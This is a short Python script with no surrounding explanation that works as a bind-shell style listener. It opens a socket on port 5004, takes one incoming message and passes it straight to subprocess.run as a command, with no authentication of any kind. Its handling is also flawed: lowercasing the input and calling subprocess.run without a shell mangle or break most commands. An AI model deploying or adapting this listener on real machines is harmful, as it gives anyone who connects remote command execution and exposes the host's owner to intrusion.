import socket
import subprocess

host = socket.gethostname()
port =5004

server = socket.socket()
server.bind((host,port))
server.listen(1)
conn,addr= server.accept()
command = conn.recv(1024).lower()

subprocess.run(command.decode())

conn.close()
server.close()